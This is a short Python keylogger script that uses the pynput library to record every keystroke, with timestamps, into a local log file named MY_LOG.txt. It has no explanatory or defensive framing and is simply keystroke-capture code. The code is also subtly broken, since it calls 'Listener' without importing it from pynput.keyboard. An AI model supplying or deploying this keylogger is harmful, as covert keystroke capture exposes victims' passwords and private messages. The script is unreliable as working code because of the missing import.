import pynput
import logging

# If no name is provided, log_dir is an empty string
log_dir = r""

# Configure basic logging
logging.basicConfig(
    filename=log_dir + r"MY_LOG.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Function called whenever a key is pressed
def on_press(key):
    logging.info(str(key))

# Start the keyboard listener
with Listener(on_press=on_press) as listener:
    listener.join()